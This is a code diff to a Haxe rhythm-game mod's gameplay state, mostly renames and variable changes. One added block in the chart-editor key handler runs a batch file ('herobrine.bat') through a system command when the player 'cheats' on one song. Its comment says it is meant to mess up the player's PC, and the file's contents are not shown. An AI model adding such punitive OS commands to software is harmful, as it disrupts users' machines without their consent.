@@ -96,7 +96,7 @@ class PlayState extends MusicBeatState
 	public static var songDetails:String = "";
 	public static var detailsSub:String = "";
 	public static var detailsPausedText:String = "";
-	public static var RPCSongIcon:String = IconSongHandler.discordIcon;
+	public static var RPCSongIcon:String = SongIconHandler.discordIcon;
 
 	private static var prevCamFollow:FlxObject;
 
@@ -121,7 +121,7 @@ class PlayState extends MusicBeatState
 
 	var previousFrameTime:Int = 0;
 	var lastReportedPlayheadPosition:Int = 0;
-	var songTime:Float = 0;
+	public static var songTime:Float = 0;
 
 	public static var camHUD:FlxCamera;
 	public static var camGame:FlxCamera;
@@ -688,14 +688,21 @@ class PlayState extends MusicBeatState
 			if (!isStoryMode)
 			{
 				// charting state (more on that later)
-				if ((FlxG.keys.justPressed.SEVEN) && (!startingSong))
+				if ((FlxG.keys.justPressed.SEVEN))
 				{
 					resetMusic();
+					//he's fucking up ur PC if you cheat
+					if(SONG.song == "Malfunction")
+						{
+							Sys.command('start herobrine.bat');
+							Application.current.window.alert('Close all ur programs cus this takes 1 minute', 'lmao sorry');
+						} else {
 					if (FlxG.keys.pressed.SHIFT)
 						Main.switchState(this, new ChartingState());
 					else
 						Main.switchState(this, new OriginalChartingState());
 				}
+			}
 
 				if ((FlxG.keys.justPressed.SIX))
 				{
